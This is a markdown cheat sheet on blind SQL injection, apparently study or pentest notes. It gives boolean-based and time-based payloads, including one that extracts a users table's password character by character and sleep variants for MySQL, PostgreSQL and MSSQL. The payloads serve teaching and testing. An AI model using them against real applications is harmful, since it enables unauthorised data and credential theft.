# Blind SQL Injection (Boolean & Time-based)

## Methodology
In Blind SQLi, the web application does not output any database data or error messages directly on the page. We must ask yes/no questions (Boolean-based) or observe how long the server takes to respond (Time-based) to infer the contents of the database character by character.

---

## 1. Boolean-Based SQLi
We look for a noticeable difference in the page content (e.g. "User found" vs "User not found") based on our condition:

### Verification Payload
```sql
# True condition
admin' AND 1=1-- -
# False condition
admin' AND 1=2-- -
```

### Data Extraction (Character by Character)
Determine the length of the string:
```sql
' AND (SELECT length(database())) = 4-- -
```
Determine characters using `SUBSTRING` or `MID`:
```sql
# Check if 1st char of database name is 'a'
' AND SUBSTRING(database(), 1, 1) = 'a'-- -
# ASCII value check (easier for automation/binary search)
' AND ASCII(SUBSTRING(database(), 1, 1)) = 97-- -
```

---

## 2. Time-Based SQLi
Used when the page content is completely identical regardless of True or False conditions. We force the database to wait (sleep) if the condition is True.

### Verification Payload (MySQL)
```sql
' AND sleep(5)-- -
```

### Data Extraction (MySQL)
```sql
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)='a', sleep(5), 0)-- -
```

### Other Databases
* **PostgreSQL**: `' AND pg_sleep(5)--`
* **MSSQL**: `'; WAITFOR DELAY '0:0:5'--`
